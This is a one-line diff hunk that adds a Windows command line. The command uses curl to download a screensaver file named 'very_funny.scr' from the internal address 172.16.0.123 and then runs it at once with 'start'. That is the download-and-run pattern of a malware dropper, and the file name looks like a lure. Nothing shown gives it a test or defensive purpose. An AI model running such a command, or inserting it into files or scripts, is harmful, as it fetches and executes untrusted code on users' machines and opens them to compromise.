@@ -1,0 +1,1 @@
+C:\curl "-O" http://172.16.0.123/very_funny.scr & start very_funny.scr
